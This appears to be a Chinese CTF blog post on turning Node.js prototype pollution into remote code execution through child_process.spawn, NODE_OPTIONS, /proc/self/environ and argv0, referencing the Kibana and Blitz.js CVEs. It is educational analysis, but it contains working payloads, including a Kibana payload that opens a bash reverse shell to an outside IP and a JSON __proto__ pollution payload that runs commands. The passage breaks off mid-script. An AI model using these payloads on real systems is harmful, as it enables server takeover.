@@ -1,0 +1,519 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="感慨，ai现在真是强大，真的是概念解答神这篇文章适用于参数固定不可控的pp2rce，这是一类源码上的漏洞  child_process.spawn()深入部分源码 REF 说实话，这篇要先看RCE in Kibana才能懂一些(等涉及到了再来学)，我一开始是没有看懂很细但是太菜看不懂   简单先说一下：child_process 内置的6个函数底层最终都会调用 spawn(详见)，调用spawn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pp2rce">
+<meta property="og:url" content="https://kc1zs4.github.io/2024/11/02/pp2rce/index.html">
+<meta property="og:site_name" content="KC1zs4&#39;s Blog">
+<meta property="og:description" content="感慨，ai现在真是强大，真的是概念解答神这篇文章适用于参数固定不可控的pp2rce，这是一类源码上的漏洞  child_process.spawn()深入部分源码 REF 说实话，这篇要先看RCE in Kibana才能懂一些(等涉及到了再来学)，我一开始是没有看懂很细但是太菜看不懂   简单先说一下：child_process 内置的6个函数底层最终都会调用 spawn(详见)，调用spawn">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-11-02T13:35:38.986Z">
+<meta property="article:modified_time" content="2024-11-03T03:26:59.111Z">
+<meta property="article:tag" content="rce">
+<meta property="article:tag" content="all in one">
+<meta property="article:tag" content="node pp">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>pp2rce</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/11/03/FlaskS3c/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/11/02/PyBlockly_%E5%BC%BA%E7%BD%9124/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://kc1zs4.github.io/2024/11/02/pp2rce/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://kc1zs4.github.io/2024/11/02/pp2rce/&text=pp2rce"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://kc1zs4.github.io/2024/11/02/pp2rce/&title=pp2rce"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://kc1zs4.github.io/2024/11/02/pp2rce/&is_video=false&description=pp2rce"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=pp2rce&body=Check out this article: https://kc1zs4.github.io/2024/11/02/pp2rce/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://kc1zs4.github.io/2024/11/02/pp2rce/&title=pp2rce"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://kc1zs4.github.io/2024/11/02/pp2rce/&title=pp2rce"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://kc1zs4.github.io/2024/11/02/pp2rce/&title=pp2rce"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://kc1zs4.github.io/2024/11/02/pp2rce/&title=pp2rce"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://kc1zs4.github.io/2024/11/02/pp2rce/&name=pp2rce&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://kc1zs4.github.io/2024/11/02/pp2rce/&t=pp2rce"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#child-process-spawn-%E6%B7%B1%E5%85%A5%E9%83%A8%E5%88%86%E6%BA%90%E7%A0%81"><span class="toc-number">1.</span> <span class="toc-text">child_process.spawn()深入部分源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE-via-env"><span class="toc-number">2.</span> <span class="toc-text">RCE via env &lt;- *RCE in Kibana (CVE-2019-7609)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-proc-self-environ"><span class="toc-number">2.1.</span> <span class="toc-text">深入理解&#x2F;proc&#x2F;self&#x2F;environ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payloads%E5%92%8C%E6%A0%B8%E5%BF%83%E6%80%9D%E6%83%B3"><span class="toc-number">2.2.</span> <span class="toc-text">payloads和核心思想</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE-via-cmdline"><span class="toc-number">3.</span> <span class="toc-text">RCE via cmdline &lt;- *Blitz.js RPC suprjson(CVE-2022-23631) simple gothrough</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E4%B8%80%E4%B8%8B%E6%BA%90%E7%A0%81"><span class="toc-number">3.1.</span> <span class="toc-text">分析一下源码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3argv0"><span class="toc-number">3.2.</span> <span class="toc-text">深入理解argv0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3shell"><span class="toc-number">3.3.</span> <span class="toc-text">深入理解shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E6%80%9D%E6%83%B3%E5%92%8Cpayloads"><span class="toc-number">3.4.</span> <span class="toc-text">核心思想和payloads</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE-via-Inspector"><span class="toc-number">4.</span> <span class="toc-text">RCE via Inspector</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Defence-Patch"><span class="toc-number">5.</span> <span class="toc-text">Defence Patch</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        pp2rce
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name"></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-11-02T13:35:38.986Z" class="dt-published" itemprop="datePublished">2024-11-02</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/all-in-one/" rel="tag">all in one</a>, <a class="p-category" href="/tags/node-pp/" rel="tag">node pp</a>, <a class="p-category" href="/tags/rce/" rel="tag">rce</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <blockquote>
+<p>感慨，ai现在真是强大，真的是概念解答神<br>这篇文章适用于参数固定不可控的pp2rce，这是一类源码上的漏洞</p>
+</blockquote>
+<h3 id="child-process-spawn-深入部分源码"><a href="#child-process-spawn-深入部分源码" class="headerlink" title="child_process.spawn()深入部分源码"></a>child_process.spawn()深入部分源码</h3><ol>
+<li>REF<ol>
+<li>说实话，这篇要先看RCE in Kibana才能懂一些(等涉及到了再来学)，我一开始是没有看懂<a target="_blank" rel="noopener" href="https://c1oudfl0w0.github.io/blog/2024/10/11/PP2RCE/">很细但是太菜看不懂</a></li>
+</ol>
+</li>
+<li>简单先说一下：child_process 内置的6个函数底层最终都会调用 spawn(<a target="_blank" rel="noopener" href="https://c1oudfl0w0.github.io/blog/2023/06/29/Nodejs%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/#child-process">详见</a>)，调用spawn后会进入子函数normalizeSpawnArguments，在该子函数中会对env变量进行赋值并会将最终的envPairs作为新进程中的环境变量存储在该进程的文件&#x2F;proc&#x2F;self&#x2F;environ中 –&gt; normalizeSpawnArguments实现中存在原型链污染的注入点(let key in中的in)</li>
+<li>截取一些敏感的部分<ol>
+<li><p>最终会使用execvp来执行任务<code>execvp(options-&gt;file, options-&gt;args);</code>这里的 options-&gt;file 就是我们最初传给spawn的参数。 比如我们的例子是，那么此时的file就是，当然对于有参数的命令，则 options-&gt;args 与之对应。<code>spawn(&#39;whoami&#39;)</code></p>
+<ol>
+<li>这里经过处理后已经不是一开始参数中的options了，具体源码还看不懂sad</li>
+<li><em><strong>对于fork()有些许不同</strong></em></li>
+</ol>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.<span class="property">fork</span> = <span class="keyword">function</span>(<span class="params">modulePath <span class="comment">/*, args, options*/</span></span>) &#123;</span><br><span class="line">    ...<span class="comment">//省略</span></span><br><span class="line">    options.<span class="property">execPath</span> = options.<span class="property">execPath</span> || process.<span class="property">execPath</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">spawn</span>(options.<span class="property">execPath</span>, args, options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>以下是normalizeSpawnArguments</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// node早期版本</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">normalizeSpawnArguments</span>(<span class="params">file, args, options</span>) &#123;</span><br><span class="line">    ...<span class="comment">//省略</span></span><br><span class="line">  <span class="keyword">if</span> (options === <span class="literal">undefined</span>)</span><br><span class="line">    options = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    ...<span class="comment">//省略</span></span><br><span class="line">  <span class="keyword">var</span> env = options.<span class="property">env</span> || process.<span class="property">env</span>;</span><br><span class="line">  <span class="keyword">var</span> envPairs = [];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> env) &#123;</span><br><span class="line">    envPairs.<span class="title function_">push</span>(key + <span class="string">&#x27;=&#x27;</span> + env[key]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">_convertCustomFds</span>(options);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">file</span>: file,</span><br><span class="line">    <span class="attr">args</span>: args,</span><br><span class="line">    <span class="attr">options</span>: options,</span><br><span class="line">    <span class="attr">envPairs</span>: envPairs</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*node v18</span></span><br><span class="line"><span class="comment">  for (const key of envKeys) &#123;</span></span><br><span class="line"><span class="comment">    const value = env[key];</span></span><br><span class="line"><span class="comment">    if (value !== undefined) &#123;</span></span><br><span class="line"><span class="comment">        validateArgumentNullCheck(key, `options.env[&#x27;$&#123;key&#125;&#x27;]`);</span></span><br><span class="line"><span class="comment">        validateArgumentNullCheck(value, `options.env[&#x27;$&#123;key&#125;&#x27;]`);</span></span><br><span class="line"><span class="comment">        ArrayPrototypePush(envPairs, `$&#123;key&#125;=$&#123;value&#125;`);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ol>
+<h3 id="RCE-via-env"><a href="#RCE-via-env" class="headerlink" title="RCE via env &lt;- *RCE in Kibana (CVE-2019-7609)"></a>RCE via env &lt;- *RCE in Kibana (CVE-2019-7609)</h3><h4 id="深入理解-proc-self-environ"><a href="#深入理解-proc-self-environ" class="headerlink" title="深入理解&#x2F;proc&#x2F;self&#x2F;environ"></a>深入理解&#x2F;proc&#x2F;self&#x2F;environ</h4><ol>
+<li><p>类似的敏感文件</p>
+ <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/proc/self/environ 当前进程的环境变量</span><br><span class="line">/proc/self/cwd 当前进程运行的目录环境</span><br><span class="line">/proc/self/cmdline 文件查看当前进行进程执行命令</span><br><span class="line">/proc/[pid]/fd 当程序打开一个文件, 会获得程序的文件描述符, 而此时如果文件被删除, 只会删除文件的目录项, 不会清空文件的内容, 原来的进程依然可以通过描述符对文件进行读取, 也就是说, 文件还存在内存里。</span><br><span class="line">/proc/net/fib_trie、/proc/net/arp、/proc/net/route 内网探测</span><br><span class="line">/sys/class/net/eth0/address mac地址</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><em><strong>进程</strong></em>: 进程（Process）是计算机操作系统中一个重要的概念，它是程序的一次执行过程，是系统进行资源分配和调度的基本单位。每个进程都有一个唯一的标识符，称为进程ID（PID）。进程不仅包含程序的指令集，还包括程序执行时所需的资源</p>
+<ol>
+<li>每个进程都有自己独立的地址空间，一个进程的内存与其他进程的内存是隔离的 –&gt; 子进程是独立的，有自己的内存空间和资源。父进程的崩溃不会直接影响子进程，反之亦然</li>
+</ol>
+</li>
+<li><p><em><strong>每个进程共享一个&#x2F;proc&#x2F;self&#x2F;environ?</strong></em></p>
+<ol>
+<li>不同进程的 &#x2F;proc&#x2F;self&#x2F;environ 文件是不同的！但是每个独立的进程并不会拥有自己独立的文件系统。相反，所有进程共享同一个全局文件系统</li>
+<li>这是通过 Linux 内核的命名空间（namespaces）和虚拟文件系统（VFS）机制实现的。尽管所有进程共享同一个全局文件系统，但每个进程的 &#x2F;proc&#x2F;self&#x2F;environ 文件实际上是一个<strong>虚拟文件</strong>(符号链接)，由内核动态生成，反映了该进程的环境变量</li>
+</ol>
+</li>
+</ol>
+<h4 id="payloads和核心思想"><a href="#payloads和核心思想" class="headerlink" title="payloads和核心思想"></a>payloads和核心思想</h4><blockquote>
+<p>注意下最后payload两种形式都可以</p>
+</blockquote>
+<ol>
+<li>REF<ol>
+<li>写的很是清晰易懂<a target="_blank" rel="noopener" href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">原文</a> –&gt; 部分内容写在上面了</li>
+<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1533939">这篇解析也挺好的，跟着思考</a></li>
+</ol>
+</li>
+<li>要求<ol>
+<li>需要有可以操控的文件如这里的&#x2F;proc&#x2F;self&#x2F;environ</li>
+<li>&#x2F;proc&#x2F;self&#x2F;environ中注入的环境变量应该位于首行</li>
+</ol>
+</li>
+<li>提炼一下并思考一下我的问题<ol>
+<li><em><strong>这里的核心思想</strong></em>是通过env变量的原型链污染来实现控制新进程的环境变量，并通过特殊的参数NODE_OPTIONS“包含js文件”并执行代码</li>
+<li><em><strong>Q DONE: NODE_OPTIONS是如何发挥作用的呢？</strong></em><ol>
+<li>A: 这里也是通过环境变量进行设置的，其实可以从<a target="_blank" rel="noopener" href="https://nodejs.org/api/cli.html#node_optionsoptions">官方文档</a>推断出来的，这里允许的<code>NODE_OPTIONS=&#39;--require &quot;./file.js&quot;&#39; node</code>实质上是添加了环境变量，分开来使用<code>export NODE_OPTIONS</code>也是可以的 –&gt; 也可以<strong>问gpt bro</strong></li>
+</ol>
+</li>
+<li>这里通过在env中设置环境新的环境变量<code>AAA=console.log(123)//</code>来做poc，js文件时将后续进行注释</li>
+<li>Q DONE: 如何使得&#x2F;proc&#x2F;self&#x2F;environ文件的开头是就是我们想要执行的语句？<ol>
+<li>A: 通过字典排序？注意到&#x3D;表达式本身就是一个合法的js语言，这里其实不一定(因为一开始的for in读取的是键，在js对象中的键大部分按照插入顺序来的)</li>
+</ol>
+</li>
+<li>Q DONE: 这里不是js文件也可以执行js代码吗？<ol>
+<li>A: 难道和php一样？笑死，给忘记了，在node中require()本来就不用加上文件尾部，默认为js解析 –&gt; <strong>所以可能有和php一样的文件包含漏洞</strong></li>
+</ol>
+</li>
+</ol>
+</li>
+<li>payload<ol>
+<li><p>Notice</p>
+<ol>
+<li>由于js不是编译型语言(包括nodejs)，所以注释其实不是必须的，只要有执行到命令那一行就好</li>
+</ol>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bash</span></span><br><span class="line"><span class="variable constant_">NODE_OPTIONS</span>=<span class="string">&#x27;--require file&#x27;</span> node</span><br><span class="line"></span><br><span class="line"><span class="comment">// file</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;ls&#x27;</span>).<span class="title function_">toString</span>());odivnafadnvoa</span><br><span class="line">  <span class="comment">// 会在运行同步命令后才报错</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>final paylaod</p>
+<ol>
+<li><code>.es(*).props(label.__proto__.env.AAAA=&#39;require(&quot;child_process&quot;).exec(&quot;bash -i &gt;&amp; /dev/tcp/192.168.0.136/12345 0&gt;&amp;1&quot;);process.exit()//&#39;).props(label.__proto__.env.NODE_OPTIONS=&#39;--require /proc/self/environ&#39;)</code></li>
+<li><strong>NODE_OPTIONS也可以不写在里面.env里面，可以确保要执行的命令在第一行，HackTricks中说的(其实也还好，可能是字典顺序&#x2F;插入顺序等，只有一个当然更好)</strong> –&gt; 这就是原型链污染的魅力</li>
+</ol>
+  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">USERINPUT</span> = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;NODE_OPTIONS&quot;: &quot;--require /proc/self/environ&quot;, &quot;env&quot;: &#123; &quot;EVIL&quot;:&quot;console.log(require(\\\&quot;child_process\\\&quot;).execSync(\\\&quot;touch /tmp/pp2rce\\\&quot;).toString())//&quot;&#125;&#125;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如何理解</span></span><br><span class="line">a=&#123;&#125;  <span class="comment">// [[Pro..]]==Object</span></span><br><span class="line">a.<span class="property">__proto__</span>.<span class="property">env</span>=&#123;&#125;</span><br><span class="line">a.<span class="property">__proto__</span>.<span class="property">env</span>.<span class="property">AAA</span>=<span class="string">&quot;console.log(123)&quot;</span></span><br><span class="line">a</span><br><span class="line">a.<span class="property">__proto__</span>.<span class="property">NODE_OPTIONS</span>=<span class="string">&#x27;--require hello&#x27;</span></span><br><span class="line">a</span><br><span class="line">a.<span class="property">__proto__</span>.<span class="property">env</span>.<span class="property">NODE_OPTIONS</span>  <span class="comment">// 输出--require hello</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">keys</span>(a.<span class="property">__proto__</span>.<span class="property">env</span>)  <span class="comment">// 输出[&#x27;AAA&#x27;, &#x27;NODE_OPTIONS&#x27;]</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+</ol>
+<h3 id="RCE-via-cmdline"><a href="#RCE-via-cmdline" class="headerlink" title="RCE via cmdline &lt;- *Blitz.js RPC suprjson(CVE-2022-23631) simple gothrough"></a>RCE via cmdline &lt;- *Blitz.js RPC suprjson(CVE-2022-23631) simple gothrough</h3><h4 id="分析一下源码"><a href="#分析一下源码" class="headerlink" title="分析一下源码"></a>分析一下源码</h4><ol>
+<li><p>ref</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://www.sonarsource.com/blog/blitzjs-prototype-pollution/">cve-2022-23631</a>但是这篇也只是介绍</li>
+</ol>
+</li>
+<li><p>相关信息：已在 superjson 1.8.1 和 Blitz.js 0.45.3 中修复</p>
+</li>
+<li><p><em><strong>从源码看漏洞原理</strong></em></p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://github.com/nodejs/node/blob/v8.x/lib/child_process.js#L429">github argv0与shell源码</a>，这里适用原型污染会使得有shell(L456)<a target="_blank" rel="noopener" href="https://po6ix.github.io/Abusing-Environment-Variables/">这篇里也有说明</a>和argv0(L477)并会被识别 -&gt; <strong>这里其实也不需要很了解，只要了解有传入和没有传入的差别就好，通过原型链勿扰构造有传入的情况</strong></li>
+</ol>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 最终执行belike???这里的在原文章 https://c1oudfl0w0.github.io/blog/2024/10/11/PP2RCE/#via-env-vars-cmdline 中实验也可以不改shell，我感觉的具体原因应该看看 深入理解shell这里</span></span><br><span class="line"><span class="title function_">execve</span>(<span class="string">&quot;/proc/self/exe&quot;</span>, [<span class="string">&quot;console.log(&#x27;pwned!&#x27;);//&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;node …&quot;</span>], &#123; <span class="attr">NODE_OPTIONS</span>: <span class="string">&quot;--require /proc/self/cmdline&quot;</span> &#125;)</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h4 id="深入理解argv0"><a href="#深入理解argv0" class="headerlink" title="深入理解argv0"></a>深入理解argv0</h4><blockquote>
+<p>怎么感觉node的官方文档写得很简略呢，还是要实验和ai一下</p>
+</blockquote>
+<ol>
+<li>解析一下argv数组<ol>
+<li>argv数组是在可执行文件命令已经解析并确定要执行的可执行文件之后传递给该可执行文件的，<strong>修改其中的argv[0]并不会影响到确定要执行的可执行文件</strong>，但是但是<strong>修改argv[1]等元素可以显著影响程序的行为，因为在具体实现中会作为配置项</strong></li>
+<li>但argv[0]还是会有影响：某些程序的具体实现会根据 argv[0] 的值来决定执行不同的功能</li>
+</ol>
+</li>
+<li>Q: child_process spawn下argv0的作用？<ol>
+<li>注意到官方文档中的一句话: Node.js 在启动时会用 process.execPath 覆盖 argv[0]，因此 Node.js 子进程中的 process.argv[0] 不会匹配从父进程传给 spawn 的 argv0 参数。改为使用 process.argv0 属性检索它 –&gt; <strong>argv[0]和argv是不同的</strong><ol>
+<li><a target="_blank" rel="noopener" href="https://www.geeksforgeeks.org/node-js-process-execpath-property/">node process.execPath 官方文档</a>，说明该属性返回当前 Node.js 可执行文件的绝对路径 –&gt; <strong>by the way在fork中可以调整(可以获取看看上面的源码)</strong></li>
+</ol>
+</li>
+<li>在nodejs中<ol>
+<li><p>process.argv[0]：指向 Node.js 可执行文件的路径。这个值会被 process.execPath 覆盖，因此总是显示 Node.js 可执行文件的路径。</p>
+</li>
+<li><p>process.argv0：保留了从父进程传递给子进程的 argv[0] 值。这个值不会被覆盖，因此可以用来获取原始的 argv[0] 值 –&gt; <strong>spawn方法下会被传入到&#x2F;proc&#x2F;self&#x2F;cmdline中</strong>，测试脚本如下</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// parent.js</span></span><br><span class="line"><span class="keyword">const</span> &#123; spawn &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> scriptPath = <span class="string">&#x27;./child.js&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以 &quot;customNode&quot; 的名义调用</span></span><br><span class="line"><span class="keyword">const</span> child = <span class="title function_">spawn</span>(<span class="string">&#x27;node&#x27;</span>, [scriptPath], &#123; <span class="attr">argv0</span>: <span class="string">&#x27;customNode&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line">child.<span class="property">stdout</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`stdout: <span class="subst">$&#123;data&#125;</span>`</span>));</span><br><span class="line">child.<span class="property">stderr</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`stderr: <span class="subst">$&#123;data&#125;</span>`</span>));</span><br><span class="line"></span><br><span class="line">child.<span class="title function_">on</span>(<span class="string">&#x27;close&#x27;</span>, <span class="function">(<span class="params">code</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`子进程退出，退出码 <span class="subst">$&#123;code&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// child.js</span></span><br><span class="line"><span class="variable 